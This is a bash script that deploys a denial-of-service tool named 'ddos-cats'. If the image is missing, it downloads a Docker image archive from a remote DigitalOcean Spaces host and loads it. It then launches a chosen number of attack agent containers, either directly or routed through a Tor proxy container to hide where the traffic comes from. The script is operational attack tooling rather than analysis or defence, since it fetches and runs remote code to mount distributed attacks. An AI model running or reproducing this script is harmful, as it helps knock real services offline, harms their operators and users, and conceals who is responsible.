#!/bin/bash

NODES=$1

if docker images | grep 'ddos-cats' | grep '1.1'; then
  echo "Image exists. Ready to go... you know.. :)"
else
  echo "Importing image"
  wget https://fucku-russian-ship-dcats.fra1.digitaloceanspaces.com/ddos-cats.tar
  docker load < ddos-cats.tar
fi

if [ -z ${2+x} ]; then
  echo "VPN MODE"

  for i in $(seq 1 $NODES); do
    echo "Starting agent: $i"
    docker run --rm --name ddos-cats-$i -d -e AGENT=$i ddos-cats:1.1
  done

else
  echo "PROXY MODE"
  docker run -d --rm --name ddos-cats-tor -p 9050:9050 osminogin/tor-simple:latest
  PROXY=$(hostname -I | awk '{print $1}')

  echo "PROXY MODE: Server -> $PROXY 9050"

  for i in $(seq 1 $NODES); do
    echo "Starting agent: $i"
    docker run --rm --name ddos-cats-$i -d -e AGENT=$i -e PROXY_SERVER=$PROXY ddos-cats:1.1
  done

fi
